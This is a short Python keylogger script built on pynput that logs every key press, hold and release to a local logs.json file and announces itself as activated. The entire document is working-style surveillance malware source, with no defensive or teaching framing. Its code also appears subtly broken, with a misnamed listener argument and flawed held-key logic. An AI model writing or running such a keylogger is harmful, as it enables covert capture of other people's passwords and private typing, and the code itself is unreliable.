# Import the required libraries
from pynput import keyboard
import json

key_list = []
x = False  # This is a Value to determine if a key is held


# Function to update the JSON file
def update_json(key_list):
    with open('logs.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)


# Function to handle key press events
def press(key):
    global x, key_list
    if x == False:
        key_list.append(
            {'Press': f'{key}'}
            # Append a dictionary indicating a key press event
        )
        x = True
    if x == True:
        key_list.append(
            {'Held': f'{key}'}
            # Append a dictionary indicating a key held event
        )
    update_json(key_list)


# Function to handle key release events
def on_release(key):
    global x, key_list
    key_list.append(
        {'Release': f'{key}'}
        # Append a dictionary indicating a key release event
    )
    if x == True:
        x = False
    update_json(key_list)


print("[+] Keylogger is activated!\n[!] Saving the key strokes in 'logs.json'")

# Create a keyboard listener with event handlers for key press and release
with keyboard.Listener(
        press=press,
        on_release=on_release) as listener:
    listener.join()